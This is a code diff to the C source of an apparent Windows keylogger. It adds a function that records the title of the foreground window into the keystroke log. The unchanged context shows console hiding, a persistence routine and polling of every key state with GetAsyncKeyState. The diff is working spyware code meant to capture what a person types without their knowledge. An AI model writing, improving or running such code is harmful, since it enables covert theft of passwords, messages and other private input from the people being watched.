@@ -206,6 +206,23 @@ void hideConsole() {
     ShowWindow(stealth, SW_HIDE);
 }
 
+void updateWindowTitle() {
+    static char lastWindowTitle[WINDOW_TITLE_BUFFER_SIZE] = {0};
+    HWND currentWindow = GetForegroundWindow();
+    char windowTitle[WINDOW_TITLE_BUFFER_SIZE] = {0};
+
+    if (currentWindow != NULL) {
+        GetWindowText(currentWindow, windowTitle, sizeof(windowTitle));
+    }
+
+    if (strlen(windowTitle) > 0 && strcmp(windowTitle, lastWindowTitle) != 0) {
+        strcpy(lastWindowTitle, windowTitle);
+        char titleLog[TITLE_LOG_BUFFER_SIZE] = {0};
+        snprintf(titleLog, sizeof(titleLog), "\n[window: %s]\n", windowTitle);
+        logKey(titleLog);
+    }
+}
+
 int main() {
     // hideConsole();
     persistence();
@@ -213,7 +230,10 @@ int main() {
     int keyStates[KEY_CODE_MAX] = {0};
 
     while (1) {
+        updateWindowTitle();
+
         Sleep(SLEEP_INTERVAL_MS);
+
         for (int key = KEY_CODE_MIN; key < KEY_CODE_MAX; key++) {
             SHORT keyState = GetAsyncKeyState(key);
             if (keyState & KEY_PRESSED) {
